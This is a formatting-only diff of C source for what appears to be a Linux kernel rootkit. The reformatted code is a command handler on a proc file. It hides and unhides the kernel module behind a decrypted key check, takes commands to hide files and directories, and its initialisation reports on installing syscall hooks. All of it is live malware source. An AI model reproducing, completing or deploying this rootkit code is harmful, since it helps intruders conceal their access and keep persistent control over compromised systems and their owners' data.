@@ -481,23 +481,25 @@ static const match_table_t tokens = {
 };
 
 struct check_unhidekey_t {
-    bool ok;
-    uint64_t address_value;
+	bool ok;
+	uint64_t address_value;
 };
 
-void _unhidekey_callback(const u8 * const buf, size_t buflen, size_t copied, void *userdata) {
-    struct check_unhidekey_t *validate = (struct check_unhidekey_t*)userdata;
-    if (validate && validate->address_value) {
-        if (validate->address_value == *((uint64_t*)buf))
-            validate->ok = true;
-    }
+void _unhidekey_callback(const u8 *const buf, size_t buflen, size_t copied,
+			 void *userdata)
+{
+	struct check_unhidekey_t *validate =
+		(struct check_unhidekey_t *)userdata;
+	if (validate && validate->address_value) {
+		if (validate->address_value == *((uint64_t *)buf))
+			validate->ok = true;
+	}
 }
 
 #define CMD_MAXLEN 128
 static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			loff_t *offset)
 {
-
 	pid_t pid;
 	char param[CMD_MAXLEN + 1] = { 0 };
 	decrypt_callback cbkey = (decrypt_callback)_unhidekey_callback;
@@ -534,16 +536,17 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			kv_hide_mod();
 			break;
 		case Opt_unhide_module: {
-				uint64_t address_value = 0;
-				struct check_unhidekey_t validate = {0};
+			uint64_t address_value = 0;
+			struct check_unhidekey_t validate = { 0 };
 
-				if ((sscanf(args[0].from, "%llx", &address_value) == 1)) {
-					validate.address_value = address_value;
-					kv_decrypt(kvmgc_unhidekey, cbkey, &validate);
-					if (validate.ok == true) {
-						kv_unhide_mod();
-					}
+			if ((sscanf(args[0].from, "%llx", &address_value) ==
+			     1)) {
+				validate.address_value = address_value;
+				kv_decrypt(kvmgc_unhidekey, cbkey, &validate);
+				if (validate.ok == true) {
+					kv_unhide_mod();
 				}
+			}
 		} break;
 		case Opt_hide_file:
 		case Opt_hide_directory: {
@@ -799,7 +802,7 @@ static void _unroll_init(void)
 
 static int __init kv_init(void)
 {
-	u8 buf[16] = {0};
+	u8 buf[16] = { 0 };
 	int rv = 0;
 	char *procname_err = "";
 	const char **name;
@@ -904,19 +907,19 @@ cont:
 	goto leave;
 
 crypto_error:
-    prerr("Crypto init error\n");
-    goto error;
+	prerr("Crypto init error\n");
+	goto error;
 background_error:
-    prerr("Could not load basic functionality.\n");
-    goto error;
+	prerr("Could not load basic functionality.\n");
+	goto error;
 sys_init_error:
-    prerr("Could not load syscalls hooks\n");
-    goto error;
+	prerr("Could not load syscalls hooks\n");
+	goto error;
 addr_error:
-    prerr("Could not get kernel function address, proc file not created.\n");
-    goto error;
+	prerr("Could not get kernel function address, proc file not created.\n");
+	goto error;
 procname_missing:
-    prerr("%s\n", procname_err);
+	prerr("%s\n", procname_err);
 error:
 	prerr("Unrolling\n");
 	_unroll_init();
